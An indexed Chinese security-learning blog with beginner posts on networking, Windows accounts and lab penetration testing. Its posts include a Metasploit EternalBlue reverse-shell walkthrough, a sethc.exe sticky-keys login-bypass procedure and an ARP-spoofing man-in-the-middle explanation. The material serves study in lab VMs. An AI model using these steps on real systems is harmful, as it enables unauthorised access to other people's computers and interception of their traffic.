<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>vulnhub中的wordpress靶场</title>
      <link href="/2020/10/27/vulnhub%E4%B8%AD%E7%9A%84wordpress%E9%9D%B6%E5%9C%BA/"/>
      <url>/2020/10/27/vulnhub%E4%B8%AD%E7%9A%84wordpress%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="vulnhub的介绍"><a href="#vulnhub的介绍" class="headerlink" title="vulnhub的介绍"></a>vulnhub的介绍</h1><p>最近刚开始学习web渗透，也搭建了一个vulnhub的靶场，在这里我介绍一下vulnhub靶场，这是一个公开的免费的web渗透靶场，我们在选好相关目标靶场之后下载靶场的相关压缩文件，解压后直接在虚拟机中打开就可以了（你所下载的压缩包其实就是一个虚拟机文件的压缩版），然后在开机之后就可以开始你的渗透之旅了。</p><h1 id="web渗透的简单了解（本人的见解欢迎指正）"><a href="#web渗透的简单了解（本人的见解欢迎指正）" class="headerlink" title="web渗透的简单了解（本人的见解欢迎指正）"></a>web渗透的简单了解（本人的见解欢迎指正）</h1><p>以我现在了解的了解web渗透分大体分为：信息收集，漏洞发现，漏洞利用拿到shell（在我看来到此为前渗透阶段），拿到shell之后利用漏洞进行提权，执行自己的目的操作（比如打爆服务器的数据），留下后门，删库跑路（至此为后渗透阶段）。</p><p>反弹shell：就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端，而我们常见的web中利用反弹shell拿到shell的原理就是利用各种软件的漏洞执行相关命令让目标PC主动连接我们的攻击机，从而完成前渗透阶段的最后一步。</p><h1 id="vulnhub中的woerdpress靶场（DC6）"><a href="#vulnhub中的woerdpress靶场（DC6）" class="headerlink" title="vulnhub中的woerdpress靶场（DC6）"></a>vulnhub中的woerdpress靶场（DC6）</h1><p>此靶场主要利用wordpress的Plainview Activity Monitor插件的漏洞来拿到shell，原理是可以从这个插件中传输数据中做手脚从而能够远程执行恶意代码，wordpress官方的公告为：<a href="http://blog.nsfocus.net/cve-2018-15877/，而我们的攻击机kali中的msf就具有对此插件的相关攻击模块。" target="_blank" rel="noopener">http://blog.nsfocus.net/cve-2018-15877/，而我们的攻击机kali中的msf就具有对此插件的相关攻击模块。</a></p><p>我们进行渗透过程中会用到WPScan这个工具，此工具为Kali自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</p><p>靶场渗透提示：wordpress的默认后台登录页面为wp-login.php。</p><p>具体渗透操作请参考大佬博客：<a href="https://www.cnblogs.com/-chenxs/p/12060347.html或者https://www.jianshu.com/p/fbb357ebf1cf" target="_blank" rel="noopener">https://www.cnblogs.com/-chenxs/p/12060347.html或者https://www.jianshu.com/p/fbb357ebf1cf</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单臂路由和ICMP协议</title>
      <link href="/2020/09/18/%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1%E5%92%8CICMP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/09/18/%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1%E5%92%8CICMP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="单臂路由"><a href="#单臂路由" class="headerlink" title="单臂路由"></a>单臂路由</h1><p>我们在设置好vlan之后如果连接同一台交换机的PC在不同的vlan之中是没有办法进行通信的（相当于处于不同的vlan的PC是处于不同的局域网），这样一来我就需要用到单臂路由（虽然现在被淘汰了），单臂路由的具体实现是在原本的路由器的接口处分生出子接口而不同的vlan则连接不同的子接口，而实现不同vlan之间的通信就需要用到这些子接口，具体过程为：在vlan2中的一台PC想要同vlan3中的一台PC进行通信的话在数据帧经过交换机之后会传到路由器，再从路由器的借口接收到数据帧之后会对所收数据帧在判断所属是哪一个vlan之后会将数据帧传输到该vlan的子接口，然后子接口在对所收数据帧进行解封装之后在根据路由表进行路由转发，也就是说每一个子接口就相当于一台路由器，而我们原本的物理路由器就是这些“路由器”的集合，由于将整体的抽象图画出之后根据图像从而称之为单臂路由（本人自己猜测）。</p><p>具体的单臂路由配置过程我就不在这里说了，每一个牌子的路由器的命令有所不同，需要自己去把路由器的命令手册dang下来自己研究。</p><h1 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h1><p>我们通常ping其他PC时所用的协议你可能会认为是强大的TCP协议，但实际上真正实现这个功能的是ICMP协议，ICMP协议属于是TCP/IP五层协议的第三层，且ICMP协议没有具体的端口号，ICMP协议具体用处为：1.网络探测 2.路由跟踪 3.错误反馈。ICMP协议数据的封装格式为：ICMP头+数据，而ICMP头中的则为ICMP类型+代码。其中，数据这一板块芝士味确认你收到了这个包，其中的内容都是些无意义的数据。而ICMP类型则是为了表现出你返回的ICMP包是什么类型，例如：是正常回包还是错误回包。而之后的类型则是为了表现出错误回包是什么类型。如果你的返回包不是错误的ICMP类型的值会与代码的值相同。</p><h2 id="几种ICMP类型的说明"><a href="#几种ICMP类型的说明" class="headerlink" title="几种ICMP类型的说明"></a>几种ICMP类型的说明</h2><p>ICMP的类型值有很多我接下来只说明几种：</p><p>1.若类型值为8则是ping请求包。</p><p>2.若类型值为0则为ping应答包。</p><p>3.若类型值为3则为目标主机不可达的错误回包，也就是这种类型的ICMP包之后的代码值会与类型值不同，而不同的代码值对应不同的回包。</p><p>4.若类型值为11则为TTL超时的数据包，这种回包可用于路由追踪（可以返回ping的过程中所经历的路由器IP地址）。而实现路由追踪的命令Windows为: tracert+IP地址       Linux为：traceroute+IP地址</p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vlan的了解</title>
      <link href="/2020/09/16/vlan%E7%9A%84%E4%BA%86%E8%A7%A3/"/>
      <url>/2020/09/16/vlan%E7%9A%84%E4%BA%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="vlan产生的原因"><a href="#vlan产生的原因" class="headerlink" title="vlan产生的原因"></a>vlan产生的原因</h1><p>在局域网中，由于我们的PC会经常性的发送广播，例如ARP广播，交换机的广播等等，我们的PC对于广播会直接接收，如果广播的内容对于我们自身的PC无用则会被丢弃，而如果一个局域网中连接的PC数量较多的话我们的PC则会运行直接“爆炸“，同时也是为了防止局域网中的广播攻击，于是就有了vlan这一技术。</p><h1 id="vlan的介绍"><a href="#vlan的介绍" class="headerlink" title="vlan的介绍"></a>vlan的介绍</h1><p>vlan主要是部署在交换机上的一种技术，我们日常生活中所用的路由器则没有这种技术，一般管理型的交换机会具有这种技术，vlan的具体实现原理为将同一局域网分为不同的虚拟局域网，简单来说就是让同一局域网中的PC相当于位于不同局域网，这样一来就会缩减广播域，减少每一台PC的接收广播的负担，而vlan实现这样工作的原理就是在交换机接收你的数据包之后跟据数据包中的MAC地址进行转发，但是在转发到目标PC连接的端口时目标端口会检查数据包来源是不是和自己在同一vlan如果不是数据包则会被丢弃，如果是则会让其通过。</p><h1 id="vlan的部署"><a href="#vlan的部署" class="headerlink" title="vlan的部署"></a>vlan的部署</h1><p>vlan的部署我了解的有三种，第一种vlan的部署是基于交换机连接端口的部署，举个例子，一台交换机上部署有两个vlan，分别为vlan1和vlan2，分别连接有两台PC如果这两台PC交换连接的福安口，那么这两台PC就会转换所处的vlan。第二种则是基于MAC地址的vlan，它和第一种相似之处都是需要手工配置，但是他会根据所连接的PC的MAC地址来进行vlan的转换。第三种则需要账号密码验证机制，其中原理我了解不多所以就不说了，但这种机制只需要你输入账号密码在验证通过之后就会为你的PC动态设置所属vlan，这种机制也是则方便的机制。</p><h1 id="vlan中的trunk"><a href="#vlan中的trunk" class="headerlink" title="vlan中的trunk"></a>vlan中的trunk</h1><p>我们在设置好同一台交换机上的vlan之后，在连接其他配置好vlan的交换机后我们会发现在同一个vlan上但连接不同的交换机的PC之间不能够通信，所以vlan中的trunk技术就有用了，由于交换机之间互相连接的端口一般是属于vlan1的而我们自己如果配置好vlan的话一般就造成了这个连接端口与其他vlan分开，而不同vlan之间又不能通信，而trunk技术的作用就是让这个交换机之间互相连接的端口不属于任何一个vlan，这样所有的vlan数据就都能够通过这个公共链路进行传输。</p><h1 id="trunk的注意事项"><a href="#trunk的注意事项" class="headerlink" title="trunk的注意事项"></a>trunk的注意事项</h1><p>trunk帮助我们解决了不同交换机之间相同vlan的通信，但是数据在传输到另一台交换机之后是怎么识别数据来自哪一个vlan的又是一个问题，这里trunk中配备的有一个协议具体如下：在交换机收到来自不同vlan的数据之后会将这个数据打上一个标签，在另一台交换机收到数据上之后会将解除这个标签并且确认数据的来源是哪一个vlan，之后再进行传输。而这个打标签的方法目前有两种分别为：lsl标签这个为Cisco公司私有的打上标签的方法，具体为将你的数据帧前加上一个26字节的数据同时也会在你的数据帧后加上一个4个字节的数据，另一种则为802.1q，这个是国际公共的加标签的协议，具体为在你的数据帧中间加上4个字节的数据。</p><p>vlan中连接PC的端口我们一般称之为接入端口，只能属于一个vlan也只能传输一个vlan的数据，而像那种连接不同交换机的端口则为中继端口，也称之为公共端口，能够允许所有vlan的数据通过。</p><p>注意：交换机在接收到带有标签的数据震后是会吧数据标签拿下来鉴定数据传输的具体端口之后再进行转发，而标签呗拿下来之后就会被丢弃不会再被加上，我们的PC不能识别带有标签的数据帧！</p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF中的永恒之蓝</title>
      <link href="/2020/08/18/MSF%E4%B8%AD%E7%9A%84%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
      <url>/2020/08/18/MSF%E4%B8%AD%E7%9A%84%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="永恒之蓝漏洞"><a href="#永恒之蓝漏洞" class="headerlink" title="永恒之蓝漏洞"></a>永恒之蓝漏洞</h1><p>永恒之蓝漏洞是于2017年发布的漏洞，可以说是一个危害性很大的漏洞，不过在此漏洞发布后不久各大厂商都做出了相关的补丁，有兴趣的可以去360上查看补丁。而永恒之蓝漏洞利用的主要是SVB这个协议，而所利用的我们PC上的445端口（所以平常别乱开445有点危险-.-），这里由于我自己也不太明白漏洞原理，所以就只介绍漏洞的使用方法了。</p><p>首先，准备kali和Windows7的虚拟机（Windows2003，2008，xp都可以，但不要尽量装最新的杀毒软件），在kali’的终端输入msfconsole进入msf然后输入use exploit/windows/smb/ms17_010_eternalblue(不确定命令的正确性的话可以同tab补全)，进入永恒之蓝的攻击页面，在进行攻击之前需要我们进行一些目标主机的设置和攻击者的设置，输入命令set RHOST 192.168.1.112（攻击目标IP），然后设置payload（攻击载荷，连接目标主机与本机的通道）命令如下：set payload windows/x64/meterpreter/reverse_tcp 调用攻击载荷，后设置攻击主机set lhost 192.168.1.113，后在命令行exploit发起攻击，攻击成功之后我们一般拿到的时system的权限，也就是最高权限，也就是说我们拿到了webshell。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web中的渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础知识补充</title>
      <link href="/2020/07/24/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/"/>
      <url>/2020/07/24/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h1><p>在我们日常生活中总能听到路由器这个名讽刺，我们日常所用家用路由器实际上可以说是一个三层交换机（交换机和路由器的集合体）,用企业的网络来说，最基本的网络由交换机和PC构成内网，再由路由器构成网关，而路由器则和外网连接，也就是说我们的PC和互联网的连接点为路由器，而路由器转发数据的过程就称为路由，那么，路由器是如何转发数据的，这里我们利用下方的简单图形进行说明，IP为10.1.1.1的PC想要利用ping来ping其他网段的PC，首先，PC会检查对方是否与自己在同一网段，如果不是则会发送ARP广播向本网段的路由器请求路由器的MAC地址，然后封装包头，将数据帧送往路由器，路由器的入接口在收到数据帧后会先将数据帧的包头解封装。这时候路由器自身内部会有一个表，我们称之为路由表，而路由表中记录的是IP地址，凡是路由器收到数据帧解封装后，会将数据帧中的目标IP与自己的路由表进行比对，如果比对相同则会将数据帧转至路由器的出接口准备进行转发，如果不同则会将数据帧丢弃，然后我们接着上边继续，路由器在与自己的路由表进行比对之后发现目标IP与自己的路由表相匹配，将原本数据转至路由器的出接口，在这时路由器的出接口想要进行对数据的封装，但没有目标的MAC地址，所以会暂时停止对数据的封装，利用ARP协议向20.1.1.0网段的网关发送ARP广播来获取对方的MAC地址然后再进行包头的封装，发送数据帧，而20.1.1.0网段的路由器也就是网关在收到数据帧后会对数据解封装然后再进行路由表的比对，然后再利用ARP广播20.1.1.1的MAC地址，将数据封装之后送至IP地址为20.1.1.1的PC。</p><p><img src="https://s1.ax1x.com/2020/07/25/Uz66tx.png" alt="实例"></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>以上所讲的是路由的基本过程，如果想要是路由器的功能更齐全的话，只会向这其中进行插入，例如VPN的功能，NAT，PAT等路由器的功能均是向以上所讲的过程之中进行插入。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP协议/中间人攻击</title>
      <link href="/2020/07/13/ARP%E5%8D%8F%E8%AE%AE-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
      <url>/2020/07/13/ARP%E5%8D%8F%E8%AE%AE-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="ARP协议的叙述（需要了解一些基本知识）"><a href="#ARP协议的叙述（需要了解一些基本知识）" class="headerlink" title="ARP协议的叙述（需要了解一些基本知识）"></a>ARP协议的叙述（需要了解一些基本知识）</h1><p>ARP协议是我们得PC用来获取目标MAC地址所需要的一种协议，举个例子，如果我们在ping同一局域网某一台PC时，我们所发的ping的请求是以帧的形式通过交换机，然后再由交换机发往所ping的PC。我们如果想要实现ping通一台PC就需要目标PC的MAC地址和IP地址，通常我们在ping的时候就已经知道目标IP地址，但不知道MAC地址，所以在我们的ping的帧从我们的PC发出之前，我们必须得要知道目标PC得IP地址，所以这时候据需要发送APR请求用来获取目标的MAC地址而过程大致为：（以源IP10.1.1.1，目标IP10.1.1.2）</p><p>我们先发送一个广播，广播中的目标MAC地址为广播地址也就是12个F，广播内容大致为：我是10.1.1.1，我的MAC地址为AA，谁是10.1.1.2，请把你的MAC地址给我，然后在这个局域网中的所有PC都会收到这个广播，然后将这个广播报文进行帧头和帧尾的去除，然后每一个PC利用ARP协议将目标IP与自己的IP进行比对，如果正确，则会通过单播应答的方式，对回发自己的MAC地址，10.1.1.1在收到这个回包之后就会将10.1.1.2的MAC地址放到目标MAC地址处，发到交换机处，在由交换机转发到目标PC</p><h1 id="ARP的相关注意事项"><a href="#ARP的相关注意事项" class="headerlink" title="ARP的相关注意事项"></a>ARP的相关注意事项</h1><p>ARP的报文只能在局域网之间转发，不同的局域网不能转发。<br>在我们接收ARP报文的时候我们的PC会在自己本机形成一个ARP缓存，这个ARP缓存可以通过cmd或者powershell来查看，命令为</p><blockquote><p>arp -a</p></blockquote><p>我们的ARP缓存会在我们的PC上存在一段时间（毕竟是缓存），当然我们PC上的静态ARP缓存不会消失。ARP协议有一个弊端就是如果收到两份相同的ARP回包它只会学习最新收到的回包，将原有的相同的MAC地址缓存进行更新。（这就是中间攻击原理）</p><h1 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h1><p>在上边我已经说了ARP的弊端，接下来就要说怎么利用了，在同一局域网中，有三台机器地址分别为10.1.1.1，10.1.1.2，10.1.1.3，我以10.1.1.2为攻击者，其他两个为被攻击者，10.1.1.2向10.1.1.1发送ARP报文内容大致为：我是10.1.1.3，我的MAC地址为AA，同时也向10.1.1.3发送ARP报文内容大致为：我是10.1.1.1，我的MAC地址为AA，此时10.1.1.1和10.1.1.3两台PC上的ARP缓存都接受ARP报文并进行了更新，此时如果10.1.1.1向10.1.1.3发送信息就会先流经10.1.1.2然后转往10.1.1.3，同样10.1.1.3发往10.1.1.1的信息也是如此，然后我们就可以利用相关软件来进行信息的窃取或者修改，具体软件我就不多说了<del>（kali的ettrecap）</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知识补充1</title>
      <link href="/2020/05/11/%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%851/"/>
      <url>/2020/05/11/%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%851/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="组与管理（本人目前就学了这么多如果有不对的地方欢迎指正）"><a href="#组与管理（本人目前就学了这么多如果有不对的地方欢迎指正）" class="headerlink" title="组与管理（本人目前就学了这么多如果有不对的地方欢迎指正）"></a>组与管理（本人目前就学了这么多如果有不对的地方欢迎指正）</h1><p>我们每一个人的电脑上都会有用户，而每一个用户的权限不一样，将相同权限的用户归于同一个族中就会形成不同的组，例如在win10系统中我们一般登录的话都是用自己的用户名和密码登录，win7中会发现我们登陆时用户名为Administrator，在这里win10与win7不同的是win10将Administrator同用户分离出来相当于是一样的“分身”，而我们所用的是分离出来的这一个。说了这么多，那么我们的电脑上到底有多少用户，<del>在这里我先对组进行解释再对用户进行解释</del>，我们电脑上的组大致分为（win10）：</p><p><strong>vmware</strong><br>Administrators<br>Device Owners<br>Distributed COM Users<br>Event Log Readers<br>Guests<br>Hyper-V Administrators<br>IIS_IUSRS<br>Performance Log Users<br>Performance Monitor Users<br>Remote Management Users<br>System Managed Accounts Group<br>Users</p><p>我的组可能和一般的不一样（<del>我装了某些软件的原因</del>），这其中权限最高的是Administrators（管理员组）这个组，而我们平常登录电脑时所用的用户名就在这个组中，但是这并不代表我们就有最高权限，在这个组中administrator有着最高权限，相当于可以对电脑上的设置进行修改，这里的Guests组是一个来访外宾组，这个组中的成员可以对你电脑上的文件进行访问，但无法进行修改，上传等功能，也就说这个组里的用户权限很小。接着我们来说一下Users这个组，这个组的成员的权限比Guests大，但比Administrators小，如果我们新建一个用户的话默认实在这个组里，如果想要对新建的用户进行权限的升级请往下看。</p><h2 id="用户标识符（SID）"><a href="#用户标识符（SID）" class="headerlink" title="用户标识符（SID）"></a>用户标识符（SID）</h2><p>我们每个用户在电脑上都会自己的SID，而SID相当于我们的身份证，一般来说，Windows普通用户的SID从1000开始（包括我们自己登陆时用的用户），而管理员也就是Administrator这个用户的SID是从500开始的。</p><h2 id="用户整体知识的补充"><a href="#用户整体知识的补充" class="headerlink" title="用户整体知识的补充"></a>用户整体知识的补充</h2><p>一个电脑的用户总体上分为三类（这里所说的是整体同上边的不一样）：system 系统账户（权限至高无上），localservices本地服务账户（普通权限），networkservices网络服务账户（普通权限），而我们上边所说的Administrators组隶属于localservices这里，而我们如果有些系统设置需要对注册表的值进行修改有时候就需要用到system这个账户（有些注册表Administrator用户权限不够），同时我们如果将win10系统默认的文件共享关闭的话也需要用到这个账户。在这里我进行一个知识补充，我们一般的用户开机密码，一些软件的登录密码等都存储在C:\windows\system32\config\SAM这个文件里（别想着去打开这个文件，凭你的权限还打不开），如果我们想要打开这个文件，就需要用到这个账户。在windows系统上，默认密码最长有效期42天（尤其是服务器系统）。</p><h2 id="介绍个部分win7和win10的漏洞"><a href="#介绍个部分win7和win10的漏洞" class="headerlink" title="介绍个部分win7和win10的漏洞"></a>介绍个部分win7和win10的漏洞</h2><p>我们在开机时输入登陆密码的界面按五次shift键，会弹出c:\windows\system32\sethc.exe程序，这时候直接重启，在重启到正在载入Windows界面是直接关机再重启，这时候会出现多个选择，选择启动启动修复选项，这之后会出现系统还原的提示，点击取消，在等待几分钟之后会出现问题原因框，点击查看详细信息，下拉点击扩展名为.txt的链接会出现一个记事本，这时候点击文件，点击打开，然后找到C:\windows\system32这个文件，然后找到cmd.exe这个程序，复制一份，将文件名改为sethc，再将原来sethc.exe这个程序的名称改为其他的，之后再次重启，再按五次shift键出来的就是cmd命令行了，之后的操作就不多说了-.-。</p><h2 id="简单的命令行命令"><a href="#简单的命令行命令" class="headerlink" title="简单的命令行命令"></a>简单的命令行命令</h2><blockquote><p>netstat -an<br>查看本机所有开放端口<br>telnet：23<br>远程桌面协议RDP：3389<br>文件共享服务：445<br>HTTP协议端口号：TCP：80<br>HTTPS协议端口号：TCP：443<br>FTP端口号： TCP： 20/21  </p><p>whoami    查看当前用户名<br>whoami  /user 查看当前用户名以及SID<br>net share   查看共享文件夹的目录<br>net share  共享文件夹名 /del   删除共享</p><p>ipconfig    查看自己本机的IP<br>ipconfig /all   查看自己本机的所有IP<br>ipconfig /release  释放IP<br>ipconfig /flushdns  删除本地dns缓存</p><p>net user laji 显示用户laji的信息<br>net user laji /add 增加用户laji<br>net user laji /del 删除用户laji<br>net user laji /active:yes 激活用户laji<br>net user laji /active:no 禁用用户laji</p><p>net localgroup 显示全部本地组<br>net localgroup administrators 显示组administrators的成员<br>net localgroup ceo /add 增加组ceo<br>net localgroup ceo laji /add 向组ceo中加入成员laji<br>net localgroup ceo laji /del 向组ceo中删除成员laji</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP和DNS的简单叙述</title>
      <link href="/2020/04/20/IP%E5%92%8CDNS%E7%9A%84%E7%AE%80%E5%8D%95%E5%8F%99%E8%BF%B0/"/>
      <url>/2020/04/20/IP%E5%92%8CDNS%E7%9A%84%E7%AE%80%E5%8D%95%E5%8F%99%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="IP的简单叙述前的部分知识补充"><a href="#IP的简单叙述前的部分知识补充" class="headerlink" title="IP的简单叙述前的部分知识补充"></a>IP的简单叙述前的部分知识补充</h1><p>众所周知，我们每一个普通的个人电脑都会有一个IP，那么IP是什么呢？</p><p>本人认为IP是一种标识性的编码，其实现在通用的普通IP是32二进制编码，但为了方便记忆一般都是将IP进行了十进制的翻译，且在翻译为十进制时，每个字节最多为3位，（有一些基本常识都知道在电脑中二进制是8位为一个字节，所以翻译为十进制最大为三位数），所以十进制下的IP地址每个字节最多为3位。</p><p>这里作为对IP地址的进一步的补充，我首先说一下网段这个概念，比如说：一个不懂中文的外国人和一个不懂英文的中国人在口语方面不能进行交流，同样的来自不同网段的的PC由于规则限制也不能够交流（这里可以将语言的不同比作为规则的限制，不同的人比作为不同网段的PC），说这麽多我们可以通过举例来说明一个网段的具体实现。</p><p>例如：10.1.1.1-10.1.1.255这一段IP可以说是一个网段，就好比在同一国家的人能够实现互相的语言交流（不同PC的交流），当然发现这个网段的IP数目有点少，我们也可以将10.1.1.1-10.1.255.255当作一个网段，这样一来IP数目就多了，能够交流的人也就多了，同样的我们可以将10.1.1.1-10.255.255.255当作一个网段，而通常我们会用10.1.1.0来表示10.1.1.1-10.1.1.255这个网段。</p><p>说这么多，那怎么在获取一个IP地址时知道它是哪个网段呢？这里我介绍一个概念：子网掩码，我们在命令行输入ipconfig可以看到我们自己PC端的IP地址，通常我们在IPv4下一行会看到子网掩码，那么子网掩码到底是干啥的？这里我举例说明一下：<br>例如我的IP为10.1.1.1，此时子网掩码为255。255.255.0，那么我的IP就属于10.1.1.0这个网段其中的一个IP，如果我的子网掩码为255.255.0.0，那么我的IP就属于10.1.0.0这个网段，其实子网掩码就是对网段位数的限制。</p><p>这里我在说明一点如果你的网段为10.1.1.0，但并不代表你属于10.1.0.0这个网段，每个网段都是相互独立的，就好比不同的人来自不用的国家（网段），虽然他们都是人（IP），有的人来自国土较小的国家，有的人来自国土较大的国家，但并不代表小国就属于大国。同样的如果我的IP为10.1.1.1，子网掩码为：255.255.255.0另一台PC的IP为：20.1.1.1，子网掩码为：255.255.255.0，我们这两台IP是不能通信的，因为我们来自不同的“国家”（网段）。</p><h1 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h1><p>所谓DNS也称域名解析服务器，这个服务器在我们的日常上网时起到了很重要的作用。</p><p>通常我们在访问一个网站时基本都是输入网站的域名，例如我访问百度时：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 这就是百度的域名（确切来说是主机名加域名，这里不做过多解释），我访问百度时而不是用百度的IP地址直接访问，这个是由于记住网站的IP实在有点难度，所以，我们就设置了域名（这是我自己的想法，具体为啥不用网站IP还有其他的原因）。</p><h2 id="接下来步入主题"><a href="#接下来步入主题" class="headerlink" title="接下来步入主题"></a>接下来步入主题</h2><h3 id="1-访问一个网站的过程的简单解释（不专业也不完全版）"><a href="#1-访问一个网站的过程的简单解释（不专业也不完全版）" class="headerlink" title="1.访问一个网站的过程的简单解释（不专业也不完全版）"></a>1.访问一个网站的过程的简单解释（不专业也不完全版）</h3><p>首先，你输入网站的域名之后，你的PC会先从你的本地缓存中找是否有你这个域名的缓存，如果没有再从你本地的一个文件中找是否有缓存（一般这个文件都是空的，这里就不多说了），然后通过你的网关也就是你的路由器，发送相关请求到DNS服务器，然后服务器会根据你的请求来进行服务器上的缓存筛选，如果服务器的缓存中有你这个域名的缓存，它会将这个域名所代表服务器的IP地址再通过你的网关发送到你的PC端上，然后你的PC根据这个IP访问相对应的服务器，这是你的PC会有一段时间有对这个域名的缓存，当你在第二次访问这个域名时你的PC会直接根据缓存中的IP地址来访问相关的服务器。</p><h3 id="2-网关的相关解释（不专业也不完全版）"><a href="#2-网关的相关解释（不专业也不完全版）" class="headerlink" title="2.网关的相关解释（不专业也不完全版）"></a>2.网关的相关解释（不专业也不完全版）</h3><p>一般来说我们组建局域网（内网）需要同过交换机，而交换机的作用其实相当于一个中介，例如：有两台PC，原本不能相互通讯，当这两台PC连上同一个交换机时就能够相互通讯，如果电脑A想发送信息到电脑B，那么这其中的过程为A所发送的信息到交换机，再由交换机转到B。</p><p>上述的情况只能够在一个局域网内进行，如果想连到外网，这里就需要路由器，而路由器就相当于内网与外网相连接窗口，我们普通家用的路由器基本上可以说是是交换机和路由器的“合体”。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件共享</title>
      <link href="/2020/04/16/%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB/"/>
      <url>/2020/04/16/%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h1><p>本人学了一点文件共享的知识在这里分享一下</p><h2 id="具体操作过程"><a href="#具体操作过程" class="headerlink" title="具体操作过程"></a>具体操作过程</h2><p>创建用户a密码为a<br>命令行：net user a a /add<br>1.创建文件夹，并在文件的属性中找到共享栏，点击高级共享在这里设置你共享的文件夹名字在高级共享中有权限设置，在这里进行相关权限的设置。<br>2.在所共享的文件夹中的安全栏中的高级处点击禁用继承，这时会弹出一个对话框提示你是否对原本的权限进行保留（根据自身需要进行选择），之后回到安全界面选择添加然后选择主体，在输入要选择的对象名称处添加你所想要授权访问的同户名，然后再给你所设置的用户设置权限。（这里你所设置的用户名必须先前在你自己的电脑上已经有的用户名）如果你想在说共享的文件夹中的子文件夹进行权限设置，步骤同上边2相同。<br>3.访问你所共享的文件夹（这里我举的例子是在同一座交换机上，也可以在虚拟机上操作）win+r打开运行窗口输入： //你要访问的共享文件夹所在的主机IP地址，然后的操作有手就行，这里不做过多阐述，另一种方法是访问文件夹也可以在运行窗口输入： //你要访问的共享文件夹所在的主机IP地址/共享文件夹名字 ，之后就可以共享了。</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>如果你想在文件共享中将一些文件隐藏起来，可以在设置文件的共享名时，在文件的共享名后边加一个$符，这样别人在访问这个文件夹时就必须在地址栏上输入： //你的IP地址/共享文件夹名/隐藏的文件夹名$<br>例如我的IP地址为10.1.1.1，我所共享的文件夹名为share我所隐藏的文件夹名为dollar，则我需要在地址栏上输入：//10.1.1.1/share/dollar$</p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站建造</title>
      <link href="/2020/04/07/%E7%BD%91%E7%AB%99%E5%BB%BA%E9%80%A0/"/>
      <url>/2020/04/07/%E7%BD%91%E7%AB%99%E5%BB%BA%E9%80%A0/</url>
      
